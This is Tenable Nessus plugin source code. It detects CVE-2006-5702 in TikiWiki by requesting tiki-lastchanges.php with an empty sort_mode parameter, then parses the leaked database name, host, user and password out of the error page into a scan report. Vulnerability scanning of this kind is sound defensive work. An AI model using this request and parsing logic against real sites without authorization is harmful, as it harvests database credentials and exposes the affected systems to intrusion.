#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(46737);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2016/11/03 20:40:06 $");

  script_cve_id("CVE-2006-5702");
  script_bugtraq_id(20858);
  script_osvdb_id(30172);
  script_xref(name:"EDB-ID", value:"2701");
  script_xref(name:"Secunia", value:"22678");

  script_name(english:"TikiWiki tiki-lastchanges.php Empty sort_mode Parameter Information Disclosure");
  script_summary(english:"Attempts to access a vulnerable web page with empty sort_mode parameter");

  script_set_attribute(attribute:"synopsis",value:
"The remote web server hosts an application that is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description",value:

"The installed version of TikiWiki reveals database credentials used
by the application when an empty 'sort_mode' parameter is passed to
the 'tiki-lastchanges.php' script.

An attacker could exploit this issue to extract the username/password
for the remote database resulting in disclosure of sensitive
information or attacks against the underlying database.

Note that other scripts included with this install are likely affected
by the same vulnerability, although Nessus has not checked them.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2006/Nov/13");
  script_set_attribute(attribute:"see_also",value:"http://dev.tikiwiki.org/tiki-view_tracker_item.php?itemId=927");
  script_set_attribute(attribute:"see_also",value:"http://tikiwiki.org/ReleaseProcess196");
  script_set_attribute(attribute:"solution", value:"Update to TikiWiki 1.9.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2006/11/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/11/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/05/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:tikiwiki:tikiwiki");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("tikiwiki_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/tikiwiki");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80,php:TRUE);

install = get_install_from_kb(appname:'tikiwiki', port:port, exit_on_fail:TRUE);
dir = install['dir'];

url = dir + "/tiki-lastchanges.php?days=1&offset=0&sort_mode=";
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

appinfo  = '';
info = '';
data = make_array();

if (
  '>An error occured in a database query' >< res[2] &&
  '["database"]=>' >< res[2] && '["databaseType"]=>' >< res[2] &&
  '["user"]=>' >< res[2] && '["password"]=>' >< res[2]
)
{
  if (report_verbosity > 0)
  {
    report = '\n' +
      'Nessus was able to verify the vulnerability using following URL : ' +  '\n\n' +
      build_url(port:port,qs:url) + '\n';

    if (report_verbosity > 1)
    {
      foreach line (split(res[2]))
      {
        if ('["database"]=>'     >< line) appinfo = "database";
        else if ('["databaseType"]=>' >< line) appinfo = "databasetype";
        else if ('["host"]=>'         >< line) appinfo = "host";
        else if ('["user"]=>'         >< line) appinfo = "user";
        else if ('["password"]=>'     >< line) appinfo = "password";

        if (appinfo && ereg(pattern:"string\([0-9]+\) .+",string:line))
        {
          matches = eregmatch(pattern:"string\([0-9]+\) (.+)",string:line);
          if (matches && matches[1])
          {
            data[appinfo] = matches[1];
            appinfo = '';
          }
        }
      }

      if (data["databasetype"]) info += "  Database Type : " + data["databasetype"] + '\n';
      if (data["database"])     info += "  Database      : " + data["database"] + '\n';
      if (data["host"])         info += "  Host          : " + data["host"] + '\n';
      if (data["user"])         info += "  User          : " + data["user"] + '\n';
      if (data["password"])     info += "  Password      : " + data["password"] + '\n';

      if (info)
        report += '\n' +
          "Nessus was able to extract the following information about the remote database : "+
          '\n\n' +
          info + '\n';
    }
    security_warning(port:port,extra:report);
  }
  else security_warning(port);
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "TikiWiki", build_url(port:port, qs:dir));
